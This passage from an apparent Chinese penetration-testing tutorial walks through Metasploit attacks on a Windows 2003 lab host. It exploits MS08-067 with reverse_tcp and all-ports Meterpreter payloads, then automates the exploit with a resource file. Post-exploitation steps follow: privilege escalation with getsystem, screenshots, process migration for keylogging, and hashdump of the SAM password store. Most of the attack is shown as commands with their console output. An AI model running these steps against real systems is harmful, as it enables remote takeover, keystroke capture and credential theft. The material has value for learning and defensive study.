   <span class="nx">LPORT</span>     <span class="mi">4444</span>             <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">listen</span> <span class="nx">port</span>


<span class="nx">Exploit</span> <span class="nx">target</span><span class="p">:</span>

   <span class="nx">Id</span>  <span class="nx">Name</span>
   <span class="o">--</span>  <span class="o">----</span>
   <span class="mi">3</span>   <span class="nx">Windows</span> <span class="mi">2003</span> <span class="nx">SP0</span> <span class="nx">Universal</span>
</code></pre></div></div>

<blockquote>
  <p>在msf框架中查找MS08_067 NETAPI攻击模块，然后使用use命令使用该模块。接下来，设置攻击载荷为基于Windows系统的<code class="highlighter-rouge">Meterpreter reverse_tcp</code>(该载荷攻击之后，会从目标主机发起一个反向连接。此连接可以绕过防火墙的入站流量保护，或者穿透NAT网关)
<code class="highlighter-rouge">Windows XP SP2 English (NX)</code>的NX(No Execute)表示“不允许执行”，即启用了DEP保护。在Win XP SP2中的DEP默认启用（仅对Windows自身服务程序）
设置LPORT参数时候，尽量使用防火墙一般会允许通行的常用端口号。本例作为演示，就不另外设置</p>
</blockquote>

<p><strong>0x03发动攻击</strong></p>

<p>配置好参数，就尝试进行攻击。</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>

<span class="nx">msf</span> <span class="nx">exploit</span><span class="p">(</span><span class="nx">ms08_067_netapi</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">run</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Started</span> <span class="nx">reverse</span> <span class="nx">TCP</span> <span class="nx">handler</span> <span class="nx">on</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.134</span><span class="p">:</span><span class="mi">4444</span> 
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Attempting</span> <span class="nx">to</span> <span class="nx">trigger</span> <span class="nx">the</span> <span class="nx">vulnerability</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Sending</span> <span class="nx">stage</span> <span class="p">(</span><span class="mi">957487</span> <span class="nx">bytes</span><span class="p">)</span> <span class="nx">to</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Meterpreter</span> <span class="nx">session</span> <span class="mi">1</span> <span class="nx">opened</span> <span class="p">(</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">10.134</span><span class="p">:</span><span class="mi">4444</span> <span class="o">-&gt;</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span><span class="p">:</span><span class="mi">2074</span><span class="p">)</span> <span class="nx">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">25</span> <span class="mi">03</span><span class="p">:</span><span class="mi">42</span><span class="p">:</span><span class="mi">19</span> <span class="o">-</span><span class="mi">0500</span>
<span class="nx">meterpreter</span> <span class="o">&gt;</span> 
</code></pre></div></div>

<blockquote>
  <p>攻击成功之后，返回一个<code class="highlighter-rouge">reverse_tcp</code>方式的Meterpreter攻击载荷会话。</p>
</blockquote>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>

<span class="nx">meterpreter</span> <span class="o">&gt;</span> <span class="nx">background</span> 
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Backgrounding</span> <span class="nx">session</span> <span class="mi">1</span><span class="p">...</span>
<span class="nx">msf</span> <span class="nx">exploit</span><span class="p">(</span><span class="nx">ms08_067_netapi</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">sessions</span> <span class="o">-</span><span class="nx">l</span> <span class="o">-</span><span class="nx">v</span>

<span class="nx">Active</span> <span class="nx">sessions</span>
<span class="o">===============</span>

  <span class="nx">Session</span> <span class="nx">ID</span><span class="p">:</span> <span class="mi">1</span>
        <span class="nx">Type</span><span class="p">:</span> <span class="nx">meterpreter</span> <span class="nx">x86</span><span class="o">/</span><span class="nx">win32</span>
        <span class="nx">Info</span><span class="p">:</span> <span class="nx">NT</span> <span class="nx">AUTHORITY</span><span class="err">\</span><span class="nx">SYSTEM</span> <span class="p">@</span> <span class="nx">ROOT</span><span class="o">-</span><span class="nx">TVI862UBEH</span>
      <span class="nx">Tunnel</span><span class="p">:</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.134</span><span class="p">:</span><span class="mi">4444</span> <span class="o">-&gt;</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span><span class="p">:</span><span class="mi">2074</span> <span class="p">(</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span><span class="p">)</span>
         <span class="nx">Via</span><span class="p">:</span> <span class="nx">exploit</span><span class="o">/</span><span class="nx">windows</span><span class="o">/</span><span class="nx">smb</span><span class="o">/</span><span class="nx">ms08_067_netapi</span>
        <span class="nx">UUID</span><span class="p">:</span> <span class="mi">69572570</span><span class="nx">cc867f74</span><span class="o">/</span><span class="nx">x86</span><span class="o">=</span><span class="mi">1</span><span class="o">/</span><span class="nx">windows</span><span class="o">=</span><span class="mi">1</span><span class="o">/-</span><span class="mi">02</span><span class="o">-</span><span class="mi">25</span><span class="nx">T08</span><span class="p">:</span><span class="mi">42</span><span class="p">:</span><span class="mi">17</span><span class="nx">Z</span>
   <span class="nx">MachineID</span><span class="p">:</span> <span class="nx">b6c81f0615bb5433af90fb7a5f47f6c8</span>
     <span class="nx">CheckIn</span><span class="p">:</span> <span class="mi">0</span><span class="nx">s</span> <span class="nx">ago</span> <span class="p">@</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">25</span> <span class="mi">04</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">12</span> <span class="o">-</span><span class="mi">0500</span>
  <span class="nx">Registered</span><span class="p">:</span> <span class="nx">No</span>

<span class="nx">msf</span> <span class="nx">exploit</span><span class="p">(</span><span class="nx">ms08_067_netapi</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">sessions</span> <span class="o">-</span><span class="nx">i</span> <span class="mi">1</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Starting</span> <span class="nx">interaction</span> <span class="kd">with</span> <span class="mi">1</span><span class="p">...</span>

<span class="nx">meterpreter</span> <span class="o">&gt;</span> 
</code></pre></div></div>

<blockquote>
  <p>meterpreter的<code class="highlighter-rouge">background</code>参数可以让当前的载荷会话隐藏在后台，<code class="highlighter-rouge">sessions -l -v</code>可以查看会话详细的信息。<code class="highlighter-rouge">session -i 1</code>可以选中ID为1的控制台会话进行交互。输入<code class="highlighter-rouge">shell</code>之后，可以进入目标系统的命令交互shell中。</p>
</blockquote>

<p><img src="/img/hack/Metasploit/1488016580635.png" alt="交互shell" /></p>

<h3 id="全端口攻击载荷暴力猜解目标开放的端口">全端口攻击载荷，暴力猜解目标开放的端口</h3>

<p>若攻击的目标有非常严格的出站端口过滤，只允许防火墙开放个别特定的端口，其他端口一律关闭，很难判定哪些端口连接到外部机器上。这时候可以通过MSF对应的攻击载荷进行尝试，直到发现其中一个是放行的，进行端口连接成功为止。</p>

<p><strong>0x01 选择ms_08_067模块</strong></p>

<p><strong>0x02 选择<code class="highlighter-rouge">windows/meterpreter/reverse_tcp_allports</code></strong></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>

<span class="nx">msf</span> <span class="nx">exploit</span><span class="p">(</span><span class="nx">ms08_067_netapi</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">payload</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp_allports</span> 
<span class="nx">payload</span> <span class="o">=&gt;</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp_allports</span>

</code></pre></div></div>

<p>设置target</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>

<span class="nx">msf</span> <span class="nx">exploit</span><span class="p">(</span><span class="nx">ms08_067_netapi</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">show</span> <span class="nx">options</span>

<span class="nx">Module</span> <span class="nx">options</span> <span class="p">(</span><span class="nx">exploit</span><span class="o">/</span><span class="nx">windows</span><span class="o">/</span><span class="nx">smb</span><span class="o">/</span><span class="nx">ms08_067_netapi</span><span class="p">):</span>

   <span class="nx">Name</span>     <span class="nx">Current</span> <span class="nx">Setting</span>  <span class="nx">Required</span>  <span class="nx">Description</span>
   <span class="o">----</span>     <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
   <span class="nx">RHOST</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span>     <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">target</span> <span class="nx">address</span>
   <span class="nx">RPORT</span>    <span class="mi">445</span>              <span class="nx">yes</span>       <span class="nb">Set</span> <span class="nx">the</span> <span class="nx">SMB</span> <span class="nx">service</span> <span class="nx">port</span>
   <span class="nx">SMBPIPE</span>  <span class="nx">BROWSER</span>          <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">pipe</span> <span class="nx">name</span> <span class="nx">to</span> <span class="nx">use</span> <span class="p">(</span><span class="nx">BROWSER</span><span class="p">,</span> <span class="nx">SRVSVC</span><span class="p">)</span>


<span class="nx">Payload</span> <span class="nx">options</span> <span class="p">(</span><span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp_allports</span><span class="p">):</span>

   <span class="nx">Name</span>      <span class="nx">Current</span> <span class="nx">Setting</span>  <span class="nx">Required</span>  <span class="nx">Description</span>
   <span class="o">----</span>      <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
   <span class="nx">EXITFUNC</span>  <span class="nx">thread</span>           <span class="nx">yes</span>       <span class="nx">Exit</span> <span class="nx">technique</span> <span class="p">(</span><span class="nx">Accepted</span><span class="p">:</span> <span class="s1">''</span><span class="p">,</span> <span class="nx">seh</span><span class="p">,</span> <span class="nx">thread</span><span class="p">,</span> <span class="nx">process</span><span class="p">,</span> <span class="nx">none</span><span class="p">)</span>
   <span class="nx">LHOST</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.134</span>     <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">listen</span> <span class="nx">address</span>
   <span class="nx">LPORT</span>     <span class="mi">1</span>                <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">starting</span> <span class="nx">port</span> <span class="nx">number</span> <span class="nx">to</span> <span class="nx">connect</span> <span class="nx">back</span> <span class="nx">on</span>


<span class="nx">Exploit</span> <span class="nx">target</span><span class="p">:</span>

   <span class="nx">Id</span>  <span class="nx">Name</span>
   <span class="o">--</span>  <span class="o">----</span>
   <span class="mi">3</span>   <span class="nx">Windows</span> <span class="mi">2003</span> <span class="nx">SP0</span> <span class="nx">Universal</span>
</code></pre></div></div>

<p><strong>0x03 攻击</strong></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nx">msf</span> <span class="nx">exploit</span><span class="p">(</span><span class="nx">ms08_067_netapi</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">exploit</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Started</span> <span class="nx">reverse</span> <span class="nx">TCP</span> <span class="nx">handler</span> <span class="nx">on</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.134</span><span class="p">:</span><span class="mi">1</span> 
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Attempting</span> <span class="nx">to</span> <span class="nx">trigger</span> <span class="nx">the</span> <span class="nx">vulnerability</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Sending</span> <span class="nx">stage</span> <span class="p">(</span><span class="mi">957487</span> <span class="nx">bytes</span><span class="p">)</span> <span class="nx">to</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Meterpreter</span> <span class="nx">session</span> <span class="mi">3</span> <span class="nx">opened</span> 

<span class="nx">meterpreter</span> <span class="o">&gt;</span> <span class="nx">shell</span>
<span class="nx">Process</span> <span class="mi">5060</span> <span class="nx">created</span><span class="p">.</span>
<span class="nx">Channel</span> <span class="mi">1</span> <span class="nx">created</span><span class="p">.</span>
<span class="nx">Microsoft</span> <span class="nx">Windows</span> <span class="p">[</span><span class="nx">Version</span> <span class="mf">5.2</span><span class="p">.</span><span class="mi">3790</span><span class="p">]</span>
<span class="p">(</span><span class="nx">C</span><span class="p">)</span> <span class="nx">Copyright</span> <span class="mi">1985</span><span class="o">-</span><span class="mi">2003</span> <span class="nx">Microsoft</span> <span class="nx">Corp</span><span class="p">.</span>
<span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">WINDOWS</span><span class="err">\</span><span class="nx">system32</span><span class="o">&gt;</span><span class="nx">whoami</span>
<span class="nx">whoami</span>
<span class="nx">nt</span> <span class="nx">authority</span><span class="err">\</span><span class="nx">system</span>
</code></pre></div></div>

<h3 id="资源文件">资源文件</h3>

<p>资源文件是MSF终端包含一系列自动化命令的脚本文件，这些文件实际上是一个可以在MSF终端运行的命令列表，列表中的命令将顺序执行。
<img src="/img/hack/Metasploit/1488517649976.png" alt="Alt text" /></p>

<p>在<code class="highlighter-rouge">/usr/share/metasploit-framework/scripts/resource</code>路径下创建资源文件<code class="highlighter-rouge">auto_msf_08.rc </code>,</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>

<span class="nx">root</span><span class="p">@</span><span class="nd">kali</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">metasploit</span><span class="o">-</span><span class="nx">framework</span><span class="o">/</span><span class="nx">scripts</span><span class="o">/</span><span class="nx">resource</span><span class="err">#</span> <span class="nx">echo</span> <span class="nx">use</span> <span class="nx">exploit</span><span class="o">/</span><span class="nx">windows</span><span class="o">/</span><span class="nx">smb</span><span class="o">/</span><span class="nx">ms08_067_netapi</span><span class="o">&gt;</span> <span class="nx">autoexploit</span><span class="p">.</span><span class="nx">rc</span>
<span class="nx">root</span><span class="p">@</span><span class="nd">kali</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">metasploit</span><span class="o">-</span><span class="nx">framework</span><span class="o">/</span><span class="nx">scripts</span><span class="o">/</span><span class="nx">resource</span><span class="err">#</span> <span class="nx">echo</span> <span class="kd">set</span> <span class="nx">RHOST</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span> <span class="o">&gt;&gt;</span><span class="nx">autoexploit</span><span class="p">.</span><span class="nx">rc</span> 
<span class="nx">root</span><span class="p">@</span><span class="nd">kali</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">metasploit</span><span class="o">-</span><span class="nx">framework</span><span class="o">/</span><span class="nx">scripts</span><span class="o">/</span><span class="nx">resource</span><span class="err">#</span> <span class="nx">echo</span> <span class="kd">set</span> <span class="nx">payload</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp_allports</span> <span class="o">&gt;&gt;</span> <span class="nx">autoexploit</span><span class="p">.</span><span class="nx">rc</span> 
<span class="nx">root</span><span class="p">@</span><span class="nd">kali</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">metasploit</span><span class="o">-</span><span class="nx">framework</span><span class="o">/</span><span class="nx">scripts</span><span class="o">/</span><span class="nx">resource</span><span class="err">#</span> <span class="nx">echo</span> <span class="kd">set</span> <span class="nx">LHOST</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.134</span> <span class="o">&gt;&gt;</span> <span class="nx">autoexploit</span><span class="p">.</span><span class="nx">rc</span> 
<span class="nx">root</span><span class="p">@</span><span class="nd">kali</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">metasploit</span><span class="o">-</span><span class="nx">framework</span><span class="o">/</span><span class="nx">scripts</span><span class="o">/</span><span class="nx">resource</span><span class="err">#</span> <span class="nx">echo</span> <span class="kd">set</span> <span class="nx">target</span> <span class="mi">3</span> <span class="o">&gt;&gt;</span> <span class="nx">autoexploit</span><span class="p">.</span><span class="nx">rc</span> 
<span class="nx">root</span><span class="p">@</span><span class="nd">kali</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">metasploit</span><span class="o">-</span><span class="nx">framework</span><span class="o">/</span><span class="nx">scripts</span><span class="o">/</span><span class="nx">resource</span><span class="err">#</span> <span class="nx">echo</span> <span class="nx">exploit</span> <span class="o">&gt;&gt;</span> <span class="nx">autoexploit</span><span class="p">.</span><span class="nx">rc</span> 
<span class="nx">root</span><span class="p">@</span><span class="nd">kali</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">metasploit</span><span class="o">-</span><span class="nx">framework</span><span class="o">/</span><span class="nx">scripts</span><span class="o">/</span><span class="nx">resource</span><span class="err">#</span> <span class="nx">cat</span> <span class="nx">autoexploit</span><span class="p">.</span><span class="nx">rc</span> 

</code></pre></div></div>

<p>msf中加载资源文件实现自动化攻击：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>

<span class="nx">msf</span> <span class="o">&gt;</span> <span class="nx">resource</span> <span class="nx">auto_msf_08</span><span class="p">.</span><span class="nx">rc</span> 
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Processing</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">metasploit</span><span class="o">-</span><span class="nx">framework</span><span class="o">/</span><span class="nx">scripts</span><span class="o">/</span><span class="nx">resource</span><span class="o">/</span><span class="nx">auto_msf_08</span><span class="p">.</span><span class="nx">rc</span> <span class="k">for</span> <span class="nx">ERB</span> <span class="nx">directives</span><span class="p">.</span>
<span class="nx">resource</span> <span class="p">(</span><span class="sr">/usr/</span><span class="nx">share</span><span class="o">/</span><span class="nx">metasploit</span><span class="o">-</span><span class="nx">framework</span><span class="o">/</span><span class="nx">scripts</span><span class="o">/</span><span class="nx">resource</span><span class="o">/</span><span class="nx">auto_msf_08</span><span class="p">.</span><span class="nx">rc</span><span class="p">)</span><span class="o">&gt;</span> <span class="nx">use</span> <span class="nx">exploit</span><span class="o">/</span><span class="nx">windows</span><span class="o">/</span><span class="nx">smb</span><span class="o">/</span><span class="nx">ms08_067_netapi</span>
<span class="nx">resource</span> <span class="p">(</span><span class="sr">/usr/</span><span class="nx">share</span><span class="o">/</span><span class="nx">metasploit</span><span class="o">-</span><span class="nx">framework</span><span class="o">/</span><span class="nx">scripts</span><span class="o">/</span><span class="nx">resource</span><span class="o">/</span><span class="nx">auto_msf_08</span><span class="p">.</span><span class="nx">rc</span><span class="p">)</span><span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">RHOST</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span>
<span class="nx">RHOST</span> <span class="o">=&gt;</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span>
<span class="nx">resource</span> <span class="p">(</span><span class="sr">/usr/</span><span class="nx">share</span><span class="o">/</span><span class="nx">metasploit</span><span class="o">-</span><span class="nx">framework</span><span class="o">/</span><span class="nx">scripts</span><span class="o">/</span><span class="nx">resource</span><span class="o">/</span><span class="nx">auto_msf_08</span><span class="p">.</span><span class="nx">rc</span><span class="p">)</span><span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">payload</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp_allports</span>
<span class="nx">payload</span> <span class="o">=&gt;</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp_allports</span>
<span class="nx">resource</span> <span class="p">(</span><span class="sr">/usr/</span><span class="nx">share</span><span class="o">/</span><span class="nx">metasploit</span><span class="o">-</span><span class="nx">framework</span><span class="o">/</span><span class="nx">scripts</span><span class="o">/</span><span class="nx">resource</span><span class="o">/</span><span class="nx">auto_msf_08</span><span class="p">.</span><span class="nx">rc</span><span class="p">)</span><span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">LHOST</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.134</span>
<span class="nx">LHOST</span> <span class="o">=&gt;</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.134</span>
<span class="nx">resource</span> <span class="p">(</span><span class="sr">/usr/</span><span class="nx">share</span><span class="o">/</span><span class="nx">metasploit</span><span class="o">-</span><span class="nx">framework</span><span class="o">/</span><span class="nx">scripts</span><span class="o">/</span><span class="nx">resource</span><span class="o">/</span><span class="nx">auto_msf_08</span><span class="p">.</span><span class="nx">rc</span><span class="p">)</span><span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">target</span> <span class="mi">3</span>
<span class="nx">target</span> <span class="o">=&gt;</span> <span class="mi">3</span>
<span class="nx">resource</span> <span class="p">(</span><span class="sr">/usr/</span><span class="nx">share</span><span class="o">/</span><span class="nx">metasploit</span><span class="o">-</span><span class="nx">framework</span><span class="o">/</span><span class="nx">scripts</span><span class="o">/</span><span class="nx">resource</span><span class="o">/</span><span class="nx">auto_msf_08</span><span class="p">.</span><span class="nx">rc</span><span class="p">)</span><span class="o">&gt;</span> <span class="nx">exploit</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Started</span> <span class="nx">reverse</span> <span class="nx">TCP</span> <span class="nx">handler</span> <span class="nx">on</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.134</span><span class="p">:</span><span class="mi">1</span> 
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Attempting</span> <span class="nx">to</span> <span class="nx">trigger</span> <span class="nx">the</span> <span class="nx">vulnerability</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Sending</span> <span class="nx">stage</span> <span class="p">(</span><span class="mi">957487</span> <span class="nx">bytes</span><span class="p">)</span> <span class="nx">to</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Meterpreter</span> <span class="nx">session</span> <span class="mi">4</span> <span class="nx">opened</span> <span class="p">(</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">10.134</span><span class="p">:</span><span class="mi">1</span> <span class="o">-&gt;</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span><span class="p">:</span><span class="mi">2977</span><span class="p">)</span> <span class="nx">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">03</span> <span class="mi">00</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">53</span> <span class="o">-</span><span class="mi">0500</span>

<span class="nx">meterpreter</span> <span class="o">&gt;</span> 
</code></pre></div></div>

<h2 id="meterpreter">Meterpreter</h2>

<p>Meterpreter是Metasploit框架的一个扩展模块，可以调用Metasploit一些功能，对目标系统进行更为深入的渗透，这些功能包括反追踪、纯内存工作模式、密码哈希值获取、特权提升、跳板攻击等等。</p>

<p>在攻击返回meterpreter会话之后，使用meterpreter模块的命令。</p>

<h3 id="getsystem命令通过各种向量攻击提升权限"><strong><code class="highlighter-rouge">getsystem</code>命令，通过各种向量攻击提升权限</strong></h3>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">meterpreter</span> <span class="o">&gt;</span> <span class="nx">getsystem</span>
<span class="p">...</span><span class="nx">got</span> <span class="nx">system</span> <span class="nx">via</span> <span class="nx">technique</span> <span class="mi">1</span> <span class="p">(</span><span class="nx">Named</span> <span class="nx">Pipe</span> <span class="nx">Impersonation</span> <span class="p">(</span><span class="nx">In</span> <span class="nx">Memory</span><span class="o">/</span><span class="nx">Admin</span><span class="p">)).</span>
</code></pre></div></div>

<p><strong><code class="highlighter-rouge">screenshot</code>命令刻意获取活动用户的桌面截屏并保存到对应路径</strong>，可以通过桌面快捷方式判断目标系统安装的软件。</p>

<p><img src="/img/hack/Metasploit/1488783462949.png" alt="Alt text" /></p>

<h3 id="sysinfo可以获取系统运行的平台"><strong><code class="highlighter-rouge">sysinfo</code>，可以获取系统运行的平台</strong></h3>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nx">meterpreter</span> <span class="o">&gt;</span> <span class="nx">sysinfo</span>
<span class="nx">Computer</span>        <span class="p">:</span> <span class="nx">ROOT</span><span class="o">-</span><span class="nx">TVI862UBEH</span>
<span class="nx">OS</span>              <span class="p">:</span> <span class="nx">Windows</span> <span class="p">.</span><span class="nx">NET</span> <span class="nx">Server</span> <span class="p">(</span><span class="nx">Build</span> <span class="mi">3790</span><span class="p">).</span>
<span class="nx">Architecture</span>    <span class="p">:</span> <span class="nx">x86</span>
<span class="nx">System</span> <span class="nx">Language</span> <span class="p">:</span> <span class="nx">en_US</span>
<span class="nx">Domain</span>          <span class="p">:</span> <span class="nx">WORKGROUP</span>
<span class="nx">Logged</span> <span class="nx">On</span> <span class="nx">Users</span> <span class="p">:</span> <span class="mi">2</span>
<span class="nx">Meterpreter</span>     <span class="p">:</span> <span class="nx">x86</span><span class="o">/</span><span class="nx">win32</span>
</code></pre></div></div>

<h3 id="获取键盘记录"><strong>获取键盘记录</strong>。</h3>

<p>获得系统的密码，可以使用破解或攻击的方法，也可以在远程的主机上进行键盘记录。</p>

<ul>
  <li>先使用<code class="highlighter-rouge">ps</code>命令来获得目标系统正在进行的进程。</li>
  <li>使用<code class="highlighter-rouge">migrate</code>命令将会话迁移到exploreer.exe进程中</li>
  <li>启动<code class="highlighter-rouge">keylog_recoder</code>模块。</li>
  <li>一段时间后，使用<code class="highlighter-rouge">Ctrl-C</code>终止。最后在另外一个终端，可以看到使用键盘记录所捕捉到的内容。</li>
</ul>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>

<span class="nx">meterpreter</span> <span class="o">&gt;</span> <span class="nx">migrate</span> <span class="mi">2136</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Migrating</span> <span class="k">from</span> <span class="mi">1020</span> <span class="nx">to</span> <span class="mi">2136</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Migration</span> <span class="nx">completed</span> <span class="nx">successfully</span><span class="p">.</span>
<span class="nx">meterpreter</span> <span class="o">&gt;</span> <span class="nx">run</span> <span class="nx">post</span><span class="o">/</span><span class="nx">windows</span><span class="o">/</span><span class="nx">capture</span><span class="o">/</span><span class="nx">keylog_recorder</span> 

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Executing</span> <span class="nx">module</span> <span class="nx">against</span> <span class="nx">ROOT</span><span class="o">-</span><span class="nx">TVI862UBEH</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Starting</span> <span class="nx">the</span> <span class="nx">keystroke</span> <span class="nx">sniffer</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Keystrokes</span> <span class="nx">being</span> <span class="nx">saved</span> <span class="k">in</span> <span class="nx">to</span> <span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="p">.</span><span class="nx">msf8</span><span class="o">/</span><span class="nx">loot</span><span class="o">/</span><span class="mi">20160306021734</span><span class="nx">_default_10</span><span class="p">.</span><span class="mf">10.10</span><span class="p">.</span><span class="mi">130</span><span class="nx">_host</span><span class="p">.</span><span class="nx">windows</span><span class="p">.</span><span class="nx">key_149067</span><span class="p">.</span><span class="nx">txt</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Recording</span> <span class="nx">keystrokes</span><span class="p">...</span>
<span class="o">^</span><span class="nx">C</span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Saving</span> <span class="nx">last</span> <span class="nx">few</span> <span class="nx">keystrokes</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Interrupt</span> 
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Stopping</span> <span class="nx">keystroke</span> <span class="nx">sniffer</span><span class="p">...</span>
<span class="nx">meterpreter</span> <span class="o">&gt;</span> 
</code></pre></div></div>

<p><img src="/img/hack/Metasploit/1488784837662.png" alt="Alt text" /></p>

<h3 id="挖掘用户名和密码"><strong>挖掘用户名和密码</strong></h3>

<h4 id="0x01提取密码哈希值"><strong>0x01提取密码哈希值</strong>。</h4>

<p>通过使用Meterpreter中的<code class="highlighter-rouge">hashdump</code>模块提取系统的用户和密码哈希值。微软Windows系统存储哈希值的方式一般为LM、NTLM、或NTLMv2.</p>

<p>获取安全账号管理器(SAM)数据库，需要在system权限下，以绕过注册表的限制，获取受保护的存有Windows用户和密码的SAM存储。
<img src="/img/hack/Metasploit/1488785106799.png" alt="Alt text" /></p>

<blockquote>
  <p>以add3b435开头的哈希值是一个空的或不存在的哈希值——空字串的占位符。由于密码超过14字节的长度，windows不能将其存储为LM形式，所以存储了aad3b435…的字符串，代表空密码。</p>
</blockquote>

